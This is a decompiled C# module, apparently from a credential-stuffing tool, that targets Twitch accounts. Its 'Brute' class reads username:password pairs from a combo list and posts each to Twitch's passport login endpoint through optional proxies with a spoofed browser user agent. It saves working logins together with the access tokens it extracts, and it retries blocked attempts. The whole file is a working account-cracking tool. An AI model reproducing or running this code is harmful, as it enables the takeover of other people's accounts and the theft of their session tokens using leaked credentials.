using System;
using System.Drawing;
using Leaf.xNet;
using RONIN.Core.BackEnd.SlavLib;
using RONIN.Core.BackEnd.Variables;

namespace dotTwitch.Core.Modules
{
	// Token: 0x02000013 RID: 19
	internal class Brute
	{
		// Token: 0x0600005D RID: 93 RVA: 0x000074F4 File Offset: 0x000056F4
		public static void DoWork()
		{
			for (;;)
			{
				SlavCore.UpdateTitle(null, 0, null, 0);
				if (Var.comboQueue.Count != 0)
				{
					try
					{
						string text = Var.comboQueue.Take();
						for (;;)
						{
							try
							{
								if (text.Contains(":") || text.Contains(";") || text.Contains("|"))
								{
									string[] array = text.Split(new char[]
									{
										':',
										';',
										'|'
									});
									string text2 = array[0];
									string text3 = array[1];
									string text4 = text2;
									if (text2.Contains("@"))
									{
										text4 = text2.Split(new char[]
										{
											'@'
										})[0];
									}
									HttpRequest httpRequest = new HttpRequest();
									try
									{
										try
										{
											httpRequest.IgnoreProtocolErrors = true;
											httpRequest.KeepAlive = true;
											httpRequest.UserAgent = Http.ChromeUserAgent();
											httpRequest.ConnectTimeout = 10000;
											if (Var.proxies.Count != 0)
											{
												httpRequest.Proxy = SlavCore.LoadProxyType();
											}
											httpRequest.Referer = "https://www.twitch.tv/directory";
											httpRequest.Get("https://passport.twitch.tv/sessions/new", null);
											string str = string.Concat(new string[]
											{
												"{\"username\":\"",
												text4,
												"\",\"password\":\"",
												text3,
												"\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\"}"
											});
											string text5 = httpRequest.Post("https://passport.twitch.tv/login", str, "text/plain;charset=UTF-8").ToString();
											if (text5.Contains("access_token"))
											{
												string value = SlavCore.Parse(text5, "\"access_token\":\"(.*?)\",\"").Groups[1].Value;
												SlavCore.SaveData(string.Concat(new string[]
												{
													text4,
													":",
													text3,
													":",
													value
												}), "dotTwitch_Brute_Hits", null, true);
												Console.WriteLine(string.Concat(new string[]
												{
													text4,
													":",
													text3,
													":",
													value
												}), Color.Green);
												SlavCore.Valid();
											}
											else
											{
												if (!text5.Contains("user does not exist") && !text5.Contains("user has been deleted") && !text5.Contains("suspended user") && !text5.Contains("user credentials incorrect") && !text5.Contains("invalid username") && !text5.Contains("user needs password reset") && !text5.Contains("invalid password"))
												{
													SlavCore.Retry();
													continue;
												}
												SlavCore.Invalid();
											}
										}
										catch (HttpException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (NullReferenceException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (Exception ex)
										{
											Console.WriteLine(ex.ToString());
											SlavCore.Error();
											continue;
										}
										break;
									}
									finally
									{
										httpRequest.Dispose();
									}
								}
								SlavCore.Invalid();
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
								SlavCore.Error();
								continue;
							}
							break;
						}
						continue;
					}
					catch (Exception ex3)
					{
						Console.WriteLine(ex3.ToString());
						continue;
					}
					break;
				}
				break;
			}
			Var.threads--;
		}
	}
}
